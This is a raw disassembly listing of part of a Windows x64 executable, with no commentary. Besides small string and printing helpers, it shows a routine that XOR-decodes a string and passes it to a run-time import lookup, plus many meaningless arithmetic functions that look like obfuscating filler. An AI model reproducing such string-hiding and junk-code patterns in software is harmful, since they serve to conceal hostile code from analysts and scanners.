   14000203e:	74 02                	je     0x140002042
   140002040:	ff d3                	call   *%rbx
   140002042:	48 8b 8c 24 90 0d 00 	mov    0xd90(%rsp),%rcx
   140002049:	00 
   14000204a:	48 85 c9             	test   %rcx,%rcx
   14000204d:	74 02                	je     0x140002051
   14000204f:	ff d3                	call   *%rbx
   140002051:	48 83 c4 28          	add    $0x28,%rsp
   140002055:	c3                   	ret
   140002056:	48 89 c8             	mov    %rcx,%rax
   140002059:	66 8b 11             	mov    (%rcx),%dx
   14000205c:	66 85 d2             	test   %dx,%dx
   14000205f:	74 1c                	je     0x14000207d
   140002061:	66 83 fa 5c          	cmp    $0x5c,%dx
   140002065:	74 0c                	je     0x140002073
   140002067:	66 83 fa 2f          	cmp    $0x2f,%dx
   14000206b:	74 06                	je     0x140002073
   14000206d:	48 83 c1 02          	add    $0x2,%rcx
   140002071:	eb e6                	jmp    0x140002059
   140002073:	48 8d 41 02          	lea    0x2(%rcx),%rax
   140002077:	48 83 c1 02          	add    $0x2,%rcx
   14000207b:	eb dc                	jmp    0x140002059
   14000207d:	c3                   	ret
   14000207e:	48 85 c9             	test   %rcx,%rcx
   140002081:	74 1a                	je     0x14000209d
   140002083:	48 89 ca             	mov    %rcx,%rdx
   140002086:	80 3a 00             	cmpb   $0x0,(%rdx)
   140002089:	74 05                	je     0x140002090
   14000208b:	48 ff c2             	inc    %rdx
   14000208e:	eb f6                	jmp    0x140002086
   140002090:	48 89 d0             	mov    %rdx,%rax
   140002093:	48 29 c8             	sub    %rcx,%rax
   140002096:	89 c2                	mov    %eax,%edx
   140002098:	e9 d2 00 00 00       	jmp    0x14000216f
   14000209d:	c3                   	ret
   14000209e:	56                   	push   %rsi
   14000209f:	48 83 ec 20          	sub    $0x20,%rsp
   1400020a3:	48 89 ce             	mov    %rcx,%rsi
   1400020a6:	0f b7 06             	movzwl (%rsi),%eax
   1400020a9:	85 c0                	test   %eax,%eax
   1400020ab:	74 20                	je     0x1400020cd
   1400020ad:	83 f8 7f             	cmp    $0x7f,%eax
   1400020b0:	76 02                	jbe    0x1400020b4
   1400020b2:	b0 3f                	mov    $0x3f,%al
   1400020b4:	88 44 24 1f          	mov    %al,0x1f(%rsp)
   1400020b8:	48 8d 4c 24 1f       	lea    0x1f(%rsp),%rcx
   1400020bd:	ba 01 00 00 00       	mov    $0x1,%edx
   1400020c2:	e8 a8 00 00 00       	call   0x14000216f
   1400020c7:	48 83 c6 02          	add    $0x2,%rsi
   1400020cb:	eb d9                	jmp    0x1400020a6
   1400020cd:	48 83 c4 20          	add    $0x20,%rsp
   1400020d1:	5e                   	pop    %rsi
   1400020d2:	c3                   	ret
   1400020d3:	48 8d 0d d1 2d 00 00 	lea    0x2dd1(%rip),%rcx        # 0x140004eab
   1400020da:	ba 02 00 00 00       	mov    $0x2,%edx
   1400020df:	e9 8b 00 00 00       	jmp    0x14000216f
   1400020e4:	48 83 ec 18          	sub    $0x18,%rsp
   1400020e8:	89 c8                	mov    %ecx,%eax
   1400020ea:	48 c1 e0 20          	shl    $0x20,%rax
   1400020ee:	48 8d 14 24          	lea    (%rsp),%rdx
   1400020f2:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400020f8:	49 89 c1             	mov    %rax,%r9
   1400020fb:	49 c1 e9 3c          	shr    $0x3c,%r9
   1400020ff:	4c 8d 15 95 2d 00 00 	lea    0x2d95(%rip),%r10        # 0x140004e9b
   140002106:	47 8a 1c 0a          	mov    (%r10,%r9,1),%r11b
   14000210a:	44 88 1a             	mov    %r11b,(%rdx)
   14000210d:	48 ff c2             	inc    %rdx
   140002110:	48 c1 e0 04          	shl    $0x4,%rax
   140002114:	41 ff c8             	dec    %r8d
   140002117:	75 df                	jne    0x1400020f8
   140002119:	48 89 e1             	mov    %rsp,%rcx
   14000211c:	ba 08 00 00 00       	mov    $0x8,%edx
   140002121:	e8 49 00 00 00       	call   0x14000216f
   140002126:	48 83 c4 18          	add    $0x18,%rsp
   14000212a:	c3                   	ret
   14000212b:	48 83 ec 18          	sub    $0x18,%rsp
   14000212f:	48 89 c8             	mov    %rcx,%rax
   140002132:	48 8d 14 24          	lea    (%rsp),%rdx
   140002136:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000213c:	49 89 c1             	mov    %rax,%r9
   14000213f:	49 c1 e9 3c          	shr    $0x3c,%r9
   140002143:	4c 8d 15 51 2d 00 00 	lea    0x2d51(%rip),%r10        # 0x140004e9b
   14000214a:	47 8a 1c 0a          	mov    (%r10,%r9,1),%r11b
   14000214e:	44 88 1a             	mov    %r11b,(%rdx)
   140002151:	48 ff c2             	inc    %rdx
   140002154:	48 c1 e0 04          	shl    $0x4,%rax
   140002158:	41 ff c8             	dec    %r8d
   14000215b:	75 df                	jne    0x14000213c
   14000215d:	48 89 e1             	mov    %rsp,%rcx
   140002160:	ba 10 00 00 00       	mov    $0x10,%edx
   140002165:	e8 05 00 00 00       	call   0x14000216f
   14000216a:	48 83 c4 18          	add    $0x18,%rsp
   14000216e:	c3                   	ret
   14000216f:	4d 85 f6             	test   %r14,%r14
   140002172:	74 30                	je     0x1400021a4
   140002174:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   140002178:	74 2a                	je     0x1400021a4
   14000217a:	48 83 ec 28          	sub    $0x28,%rsp
   14000217e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002185:	00 00 
   140002187:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%rsp)
   14000218e:	00 
   14000218f:	41 89 d0             	mov    %edx,%r8d
   140002192:	48 89 ca             	mov    %rcx,%rdx
   140002195:	4c 89 f1             	mov    %r14,%rcx
   140002198:	4c 8d 4c 24 18       	lea    0x18(%rsp),%r9
   14000219d:	41 ff d5             	call   *%r13
   1400021a0:	48 83 c4 28          	add    $0x28,%rsp
   1400021a4:	c3                   	ret
   1400021a5:	56                   	push   %rsi
   1400021a6:	57                   	push   %rdi
   1400021a7:	48 89 ce             	mov    %rcx,%rsi
   1400021aa:	48 89 d7             	mov    %rdx,%rdi
   1400021ad:	44 89 c1             	mov    %r8d,%ecx
   1400021b0:	85 c9                	test   %ecx,%ecx
   1400021b2:	74 11                	je     0x1400021c5
   1400021b4:	8a 06                	mov    (%rsi),%al
   1400021b6:	44 30 c8             	xor    %r9b,%al
   1400021b9:	88 07                	mov    %al,(%rdi)
   1400021bb:	48 ff c6             	inc    %rsi
   1400021be:	48 ff c7             	inc    %rdi
   1400021c1:	ff c9                	dec    %ecx
   1400021c3:	75 ef                	jne    0x1400021b4
   1400021c5:	5f                   	pop    %rdi
   1400021c6:	5e                   	pop    %rsi
   1400021c7:	c3                   	ret
   1400021c8:	53                   	push   %rbx
   1400021c9:	56                   	push   %rsi
   1400021ca:	57                   	push   %rdi
   1400021cb:	48 83 ec 40          	sub    $0x40,%rsp
   1400021cf:	89 d3                	mov    %edx,%ebx
   1400021d1:	45 88 c1             	mov    %r8b,%r9b
   1400021d4:	41 89 d0             	mov    %edx,%r8d
   1400021d7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400021dc:	e8 c4 ff ff ff       	call   0x1400021a5
   1400021e1:	c6 44 1c 20 00       	movb   $0x0,0x20(%rsp,%rbx,1)
   1400021e6:	48 89 e9             	mov    %rbp,%rcx
   1400021e9:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400021ee:	ff 15 e0 a3 d6 05    	call   *0x5d6a3e0(%rip)        # 0x145d6c5d4
   1400021f4:	48 83 c4 40          	add    $0x40,%rsp
   1400021f8:	5f                   	pop    %rdi
   1400021f9:	5e                   	pop    %rsi
   1400021fa:	5b                   	pop    %rbx
   1400021fb:	c3                   	ret
   1400021fc:	56                   	push   %rsi
   1400021fd:	57                   	push   %rdi
   1400021fe:	48 89 d7             	mov    %rdx,%rdi
   140002201:	48 89 ce             	mov    %rcx,%rsi
   140002204:	66 8b 06             	mov    (%rsi),%ax
   140002207:	66 89 07             	mov    %ax,(%rdi)
   14000220a:	48 83 c6 02          	add    $0x2,%rsi
   14000220e:	48 83 c7 02          	add    $0x2,%rdi
   140002212:	66 85 c0             	test   %ax,%ax
   140002215:	75 ed                	jne    0x140002204
   140002217:	48 83 ef 02          	sub    $0x2,%rdi
   14000221b:	48 89 f8             	mov    %rdi,%rax
   14000221e:	5f                   	pop    %rdi
   14000221f:	5e                   	pop    %rsi
   140002220:	c3                   	ret
   140002221:	44 0f b7 01          	movzwl (%rcx),%r8d
   140002225:	66 45 85 c0          	test   %r8w,%r8w
   140002229:	74 33                	je     0x14000225e
   14000222b:	44 0f b7 0a          	movzwl (%rdx),%r9d
   14000222f:	41 83 f8 61          	cmp    $0x61,%r8d
   140002233:	72 0a                	jb     0x14000223f
   140002235:	41 83 f8 7a          	cmp    $0x7a,%r8d
   140002239:	77 04                	ja     0x14000223f
   14000223b:	41 83 e8 20          	sub    $0x20,%r8d
   14000223f:	41 83 f9 61          	cmp    $0x61,%r9d
   140002243:	72 0a                	jb     0x14000224f
   140002245:	41 83 f9 7a          	cmp    $0x7a,%r9d
   140002249:	77 04                	ja     0x14000224f
   14000224b:	41 83 e9 20          	sub    $0x20,%r9d
   14000224f:	45 39 c8             	cmp    %r9d,%r8d
   140002252:	75 10                	jne    0x140002264
   140002254:	48 83 c1 02          	add    $0x2,%rcx
   140002258:	48 83 c2 02          	add    $0x2,%rdx
   14000225c:	eb c3                	jmp    0x140002221
   14000225e:	b8 01 00 00 00       	mov    $0x1,%eax
   140002263:	c3                   	ret
   140002264:	31 c0                	xor    %eax,%eax
   140002266:	c3                   	ret
   140002267:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000226e:	72 12                	jb     0x140002282
   140002270:	8b 01                	mov    (%rcx),%eax
   140002272:	05 2c 0d 3c 00       	add    $0x3c0d2c,%eax
   140002277:	0d 41 5c a4 00       	or     $0xa45c41,%eax
   14000227c:	0d d4 85 7e 00       	or     $0x7e85d4,%eax
   140002281:	c3                   	ret
   140002282:	83 c8 ff             	or     $0xffffffff,%eax
   140002285:	c3                   	ret
   140002286:	89 c8                	mov    %ecx,%eax
   140002288:	c1 e8 08             	shr    $0x8,%eax
   14000228b:	25 ff 0f 00 00       	and    $0xfff,%eax
   140002290:	3d a1 02 00 00       	cmp    $0x2a1,%eax
   140002295:	75 06                	jne    0x14000229d
   140002297:	0d 00 00 00 40       	or     $0x40000000,%eax
   14000229c:	c3                   	ret
   14000229d:	25 ff 07 00 00       	and    $0x7ff,%eax
   1400022a2:	c3                   	ret
   1400022a3:	89 c8                	mov    %ecx,%eax
   1400022a5:	c1 e8 08             	shr    $0x8,%eax
   1400022a8:	83 e0 0f             	and    $0xf,%eax
   1400022ab:	83 f8 03             	cmp    $0x3,%eax
   1400022ae:	75 06                	jne    0x1400022b6
   1400022b0:	0d 00 00 00 40       	or     $0x40000000,%eax
   1400022b5:	c3                   	ret
   1400022b6:	83 e0 07             	and    $0x7,%eax
   1400022b9:	c3                   	ret
   1400022ba:	48 83 ec 28          	sub    $0x28,%rsp
   1400022be:	85 c9                	test   %ecx,%ecx
   1400022c0:	74 46                	je     0x140002308
   1400022c2:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   1400022c8:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400022cc:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   1400022d3:	00 
   1400022d4:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   1400022d9:	7e 2d                	jle    0x140002308
   1400022db:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%rsp)
   1400022e2:	00 
   1400022e3:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   1400022e8:	7e 17                	jle    0x140002301
   1400022ea:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400022ee:	03 44 24 10          	add    0x10(%rsp),%eax
   1400022f2:	03 44 24 08          	add    0x8(%rsp),%eax
   1400022f6:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   1400022fa:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   1400022ff:	eb e2                	jmp    0x1400022e3
   140002301:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002306:	eb cc                	jmp    0x1400022d4
   140002308:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000230c:	48 83 c4 28          	add    $0x28,%rsp
   140002310:	c3                   	ret
   140002311:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002318:	72 3b                	jb     0x140002355
   14000231a:	48 83 ec 28          	sub    $0x28,%rsp
   14000231e:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002325:	00 
   140002326:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   14000232b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002330:	e8 85 ff ff ff       	call   0x1400022ba
   140002335:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002339:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000233e:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002343:	e8 3e ff ff ff       	call   0x140002286
   140002348:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000234c:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002350:	48 83 c4 28          	add    $0x28,%rsp
   140002354:	c3                   	ret
   140002355:	83 c8 ff             	or     $0xffffffff,%eax
   140002358:	c3                   	ret
   140002359:	89 c8                	mov    %ecx,%eax
   14000235b:	c1 e8 18             	shr    $0x18,%eax
   14000235e:	83 e0 0f             	and    $0xf,%eax
   140002361:	83 f8 06             	cmp    $0x6,%eax
   140002364:	75 06                	jne    0x14000236c
   140002366:	0d 00 00 00 80       	or     $0x80000000,%eax
   14000236b:	c3                   	ret
   14000236c:	83 e0 07             	and    $0x7,%eax
   14000236f:	c3                   	ret
   140002370:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002377:	72 0c                	jb     0x140002385
   140002379:	0f b6 01             	movzbl (%rcx),%eax
   14000237c:	6b c0 5c             	imul   $0x5c,%eax,%eax
   14000237f:	35 de 03 76 00       	xor    $0x7603de,%eax
   140002384:	c3                   	ret
   140002385:	b8 57 00 07 80       	mov    $0x80070057,%eax
   14000238a:	c3                   	ret
   14000238b:	89 c8                	mov    %ecx,%eax
   14000238d:	c1 e8 18             	shr    $0x18,%eax
   140002390:	25 ff 0f 00 00       	and    $0xfff,%eax
   140002395:	3d ab 04 00 00       	cmp    $0x4ab,%eax
   14000239a:	75 06                	jne    0x1400023a2
   14000239c:	0d 00 00 00 10       	or     $0x10000000,%eax
   1400023a1:	c3                   	ret
   1400023a2:	25 ff 07 00 00       	and    $0x7ff,%eax
   1400023a7:	c3                   	ret
   1400023a8:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400023af:	72 4e                	jb     0x1400023ff
   1400023b1:	48 83 ec 28          	sub    $0x28,%rsp
   1400023b5:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400023bc:	00 
   1400023bd:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400023c2:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   1400023c7:	e8 45 ff ff ff       	call   0x140002311
   1400023cc:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400023d0:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   1400023d5:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   1400023da:	e8 c4 fe ff ff       	call   0x1400022a3
   1400023df:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400023e3:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400023e8:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400023ed:	e8 7e ff ff ff       	call   0x140002370
   1400023f2:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400023f6:	8b 44 24 08          	mov    0x8(%rsp),%eax
   1400023fa:	48 83 c4 28          	add    $0x28,%rsp
   1400023fe:	c3                   	ret
   1400023ff:	83 c8 ff             	or     $0xffffffff,%eax
   140002402:	c3                   	ret
   140002403:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000240a:	72 0e                	jb     0x14000241a
   14000240c:	0f b6 01             	movzbl (%rcx),%eax
   14000240f:	0d de f5 e6 00       	or     $0xe6f5de,%eax
   140002414:	05 1f b9 50 00       	add    $0x50b91f,%eax
   140002419:	c3                   	ret
   14000241a:	b8 05 40 00 80       	mov    $0x80004005,%eax
   14000241f:	c3                   	ret
   140002420:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002427:	73 07                	jae    0x140002430
   140002429:	48 8d 0d 8d 25 00 00 	lea    0x258d(%rip),%rcx        # 0x1400049bd
   140002430:	31 c0                	xor    %eax,%eax
   140002432:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140002438:	45 85 d2             	test   %r10d,%r10d
   14000243b:	74 17                	je     0x140002454
   14000243d:	41 83 ea 01          	sub    $0x1,%r10d
   140002441:	0f b6 11             	movzbl (%rcx),%edx
   140002444:	84 d2                	test   %dl,%dl
   140002446:	74 0c                	je     0x140002454
   140002448:	80 fa 20             	cmp    $0x20,%dl
   14000244b:	75 02                	jne    0x14000244f
   14000244d:	ff c0                	inc    %eax
   14000244f:	48 ff c1             	inc    %rcx
   140002452:	eb e4                	jmp    0x140002438
   140002454:	c3                   	ret
   140002455:	48 83 ec 28          	sub    $0x28,%rsp
   140002459:	85 c9                	test   %ecx,%ecx
   14000245b:	74 46                	je     0x1400024a3
   14000245d:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002463:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002467:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   14000246e:	00 
   14000246f:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002474:	7e 2d                	jle    0x1400024a3
   140002476:	c7 44 24 10 08 00 00 	movl   $0x8,0x10(%rsp)
   14000247d:	00 
   14000247e:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002483:	7e 17                	jle    0x14000249c
   140002485:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002489:	33 44 24 10          	xor    0x10(%rsp),%eax
   14000248d:	33 44 24 08          	xor    0x8(%rsp),%eax
   140002491:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002495:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   14000249a:	eb e2                	jmp    0x14000247e
   14000249c:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   1400024a1:	eb cc                	jmp    0x14000246f
   1400024a3:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400024a7:	48 83 c4 28          	add    $0x28,%rsp
   1400024ab:	c3                   	ret
   1400024ac:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400024b3:	72 26                	jb     0x1400024db
   1400024b5:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   1400024bc:	72 1d                	jb     0x1400024db
   1400024be:	44 0f b7 01          	movzwl (%rcx),%r8d
   1400024c2:	44 0f b7 0a          	movzwl (%rdx),%r9d
   1400024c6:	66 45 39 c8          	cmp    %r9w,%r8w
   1400024ca:	7c 05                	jl     0x1400024d1
   1400024cc:	7f 07                	jg     0x1400024d5
   1400024ce:	31 c0                	xor    %eax,%eax
   1400024d0:	c3                   	ret
   1400024d1:	83 c8 ff             	or     $0xffffffff,%eax
   1400024d4:	c3                   	ret
   1400024d5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400024da:	c3                   	ret
   1400024db:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400024e0:	c3                   	ret
   1400024e1:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400024e8:	72 4e                	jb     0x140002538
   1400024ea:	48 83 ec 28          	sub    $0x28,%rsp
   1400024ee:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400024f5:	00 
   1400024f6:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   1400024fb:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140002500:	e8 a3 fe ff ff       	call   0x1400023a8
   140002505:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002509:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   14000250e:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002513:	e8 3d ff ff ff       	call   0x140002455
   140002518:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000251c:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002521:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140002526:	e8 5b fd ff ff       	call   0x140002286
   14000252b:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000252f:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002533:	48 83 c4 28          	add    $0x28,%rsp
   140002537:	c3                   	ret
   140002538:	83 c8 ff             	or     $0xffffffff,%eax
   14000253b:	c3                   	ret
   14000253c:	48 83 ec 28          	sub    $0x28,%rsp
   140002540:	85 c9                	test   %ecx,%ecx
   140002542:	74 46                	je     0x14000258a
   140002544:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   14000254a:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000254e:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002555:	00 
   140002556:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   14000255b:	7e 2d                	jle    0x14000258a
   14000255d:	c7 44 24 10 04 00 00 	movl   $0x4,0x10(%rsp)
   140002564:	00 
   140002565:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   14000256a:	7e 17                	jle    0x140002583
   14000256c:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002570:	33 44 24 10          	xor    0x10(%rsp),%eax
   140002574:	33 44 24 08          	xor    0x8(%rsp),%eax
   140002578:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   14000257c:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002581:	eb e2                	jmp    0x140002565
   140002583:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002588:	eb cc                	jmp    0x140002556
   14000258a:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000258e:	48 83 c4 28          	add    $0x28,%rsp
   140002592:	c3                   	ret
   140002593:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000259a:	72 0e                	jb     0x1400025aa
   14000259c:	0f b7 01             	movzwl (%rcx),%eax
   14000259f:	25 e1 95 6d 00       	and    $0x6d95e1,%eax
   1400025a4:	0d 34 19 ff 00       	or     $0xff1934,%eax
   1400025a9:	c3                   	ret
   1400025aa:	83 c8 ff             	or     $0xffffffff,%eax
   1400025ad:	c3                   	ret
   1400025ae:	48 83 ec 28          	sub    $0x28,%rsp
   1400025b2:	85 c9                	test   %ecx,%ecx
   1400025b4:	74 47                	je     0x1400025fd
   1400025b6:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   1400025bc:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400025c0:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   1400025c7:	00 
   1400025c8:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   1400025cd:	7e 2e                	jle    0x1400025fd
   1400025cf:	c7 44 24 10 08 00 00 	movl   $0x8,0x10(%rsp)
   1400025d6:	00 
   1400025d7:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   1400025dc:	7e 18                	jle    0x1400025f6
   1400025de:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400025e2:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   1400025e7:	03 44 24 08          	add    0x8(%rsp),%eax
   1400025eb:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   1400025ef:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   1400025f4:	eb e1                	jmp    0x1400025d7
   1400025f6:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   1400025fb:	eb cb                	jmp    0x1400025c8
   1400025fd:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002601:	48 83 c4 28          	add    $0x28,%rsp
   140002605:	c3                   	ret
   140002606:	48 83 ec 28          	sub    $0x28,%rsp
   14000260a:	85 c9                	test   %ecx,%ecx
   14000260c:	74 46                	je     0x140002654
   14000260e:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002614:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002618:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   14000261f:	00 
   140002620:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002625:	7e 2d                	jle    0x140002654
   140002627:	c7 44 24 10 04 00 00 	movl   $0x4,0x10(%rsp)
   14000262e:	00 
   14000262f:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002634:	7e 17                	jle    0x14000264d
   140002636:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000263a:	03 44 24 10          	add    0x10(%rsp),%eax
   14000263e:	03 44 24 08          	add    0x8(%rsp),%eax
   140002642:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002646:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   14000264b:	eb e2                	jmp    0x14000262f
   14000264d:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002652:	eb cc                	jmp    0x140002620
   140002654:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002658:	48 83 c4 28          	add    $0x28,%rsp
   14000265c:	c3                   	ret
   14000265d:	48 83 ec 28          	sub    $0x28,%rsp
   140002661:	85 c9                	test   %ecx,%ecx
   140002663:	74 47                	je     0x1400026ac
   140002665:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   14000266b:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000266f:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002676:	00 
   140002677:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   14000267c:	7e 2e                	jle    0x1400026ac
   14000267e:	c7 44 24 10 04 00 00 	movl   $0x4,0x10(%rsp)
   140002685:	00 
   140002686:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   14000268b:	7e 18                	jle    0x1400026a5
   14000268d:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002691:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   140002696:	03 44 24 08          	add    0x8(%rsp),%eax
   14000269a:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   14000269e:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   1400026a3:	eb e1                	jmp    0x140002686
   1400026a5:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   1400026aa:	eb cb                	jmp    0x140002677
   1400026ac:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400026b0:	48 83 c4 28          	add    $0x28,%rsp
   1400026b4:	c3                   	ret
   1400026b5:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400026bc:	73 07                	jae    0x1400026c5
   1400026be:	48 8d 0d 85 24 00 00 	lea    0x2485(%rip),%rcx        # 0x140004b4a
   1400026c5:	31 c0                	xor    %eax,%eax
   1400026c7:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   1400026cd:	45 85 d2             	test   %r10d,%r10d
   1400026d0:	74 17                	je     0x1400026e9
   1400026d2:	41 83 ea 01          	sub    $0x1,%r10d
   1400026d6:	0f b6 11             	movzbl (%rcx),%edx
   1400026d9:	84 d2                	test   %dl,%dl
   1400026db:	74 0c                	je     0x1400026e9
   1400026dd:	80 fa 3d             	cmp    $0x3d,%dl
   1400026e0:	75 02                	jne    0x1400026e4
   1400026e2:	ff c0                	inc    %eax
   1400026e4:	48 ff c1             	inc    %rcx
   1400026e7:	eb e4                	jmp    0x1400026cd
   1400026e9:	c3                   	ret
   1400026ea:	89 c8                	mov    %ecx,%eax
   1400026ec:	c1 e8 14             	shr    $0x14,%eax
   1400026ef:	25 ff 0f 00 00       	and    $0xfff,%eax
   1400026f4:	3d 79 02 00 00       	cmp    $0x279,%eax
   1400026f9:	75 06                	jne    0x140002701
   1400026fb:	0d 00 00 00 40       	or     $0x40000000,%eax
   140002700:	c3                   	ret
   140002701:	25 ff 07 00 00       	and    $0x7ff,%eax
   140002706:	c3                   	ret
   140002707:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000270e:	72 25                	jb     0x140002735
   140002710:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140002717:	72 1c                	jb     0x140002735
   140002719:	44 0f b6 01          	movzbl (%rcx),%r8d
   14000271d:	44 0f b6 0a          	movzbl (%rdx),%r9d
   140002721:	45 38 c8             	cmp    %r9b,%r8b
   140002724:	7c 05                	jl     0x14000272b
   140002726:	7f 07                	jg     0x14000272f
   140002728:	31 c0                	xor    %eax,%eax
   14000272a:	c3                   	ret
   14000272b:	83 c8 ff             	or     $0xffffffff,%eax
   14000272e:	c3                   	ret
   14000272f:	b8 01 00 00 00       	mov    $0x1,%eax
   140002734:	c3                   	ret
   140002735:	b8 57 00 07 80       	mov    $0x80070057,%eax
   14000273a:	c3                   	ret
   14000273b:	48 83 ec 28          	sub    $0x28,%rsp
   14000273f:	85 c9                	test   %ecx,%ecx
   140002741:	74 46                	je     0x140002789
   140002743:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002749:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000274d:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002754:	00 
   140002755:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
